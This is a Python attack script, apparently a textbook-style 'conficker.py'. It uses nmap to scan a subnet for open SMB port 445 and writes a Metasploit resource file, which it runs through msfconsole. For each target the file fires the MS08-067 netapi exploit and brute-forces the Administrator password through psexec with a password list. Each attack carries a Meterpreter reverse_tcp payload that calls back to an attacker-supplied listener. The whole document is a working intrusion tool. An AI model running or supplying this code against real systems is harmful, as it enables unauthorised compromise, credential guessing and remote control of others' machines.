import os
import argparse
import nmap


def find_tgts(subnet):
    nmap_scan = nmap.PortScanner()
    nmap_scan.scan(subnet, '445')
    hosts = []
    for host in nmap_scan.all_hosts():
        if nmap_scan[host].has_tcp(445):
            state = nmap_scan[host]['tcp'][445]['state']
            if state == 'open':
                print(f'[+] Found Target Host: {host}')
                hosts.append(host)
    return hosts


def setup_handler(config_file, lhost, lport):
    config_file.write('use exploit/multi/handler\n')
    config_file.write('set payload windows/meterpreter/reverse_tcp\n')
    config_file.write(f'set LPORT {str(lport)}\n')
    config_file.write(f'set LHOST {lhost}\n')
    config_file.write('exploit -j -z\n')
    config_file.write('setg DisablePayloadHandler 1\n')


def conficker_exploit(config_file, host, lhost, lport):
    config_file.write('use exploit/windows/smb/ms08_067_netapi\n')
    config_file.write(f'set RHOST {str(host)}\n')
    config_file.write('set payload windows/meterpreter/reverse_tcp\n')
    config_file.write(f'set LPORT {str(lport)}\n')
    config_file.write(f'set LHOST {lhost}\n')
    config_file.write('exploit -j -z\n')


def smb_brute(config_file, host, passwd_file, lhost, lport):
    username = 'Administrator'
    with open(passwd_file) as file:
        for password in file.readlines():
            password = password.strip('\n').strip('\r')
            config_file.write('use exploit/windows/smb/psexec\n')
            config_file.write(f'set SMBUser {str(username)}\n')
            config_file.write(f'set SMBPass {str(password)}\n')
            config_file.write(f'set RHOST  {str(host)}\n')
            config_file.write('set payload windows/meterpreter/reverse_tcp\n')
            config_file.write(f'set LPORT {str(lport)}\n')
            config_file.write(f'set LHOST {lhost}\n')
            config_file.write('exploit -j -z\n')


if __name__ == '__main__':
    with open('meta.rc', 'w') as metarc_file:
        parser = argparse.ArgumentParser(
            usage='python conficker.py TARGET_HOST[S] -l LHOST'
                  '[-p LPORT -f PASSWORD_FILE]')
        parser.add_argument('tgt_hosts', type=str, metavar='TARGET_HOST[S]',
                            help='specify the target host[s] address[es] '
                                 'separated by commas (no spaces')
        parser.add_argument('-l', type=str, metavar='LHOST', required=True,
                            help='specify the address of the listener')
        parser.add_argument('-p', type=int, metavar='LPORT', default=1337,
                            help='specify the port used by the listener')
        parser.add_argument('-f', type=str, metavar='PASSWORD_FILE',
                            help='password file for SMB brute-force attempt')

        args = parser.parse_args()

        tgt_list = find_tgts(args.tgt_hosts)
        l_host = args.l
        l_port = args.p
        pass_file = args.f

        setup_handler(metarc_file, l_host, l_port)

        for tgt_host in tgt_list:
            conficker_exploit(metarc_file, tgt_host, l_host, l_port)
            if pass_file:
                smb_brute(metarc_file, tgt_host, pass_file, l_host, l_port)

    os.system('msfconsole -r meta.rc')
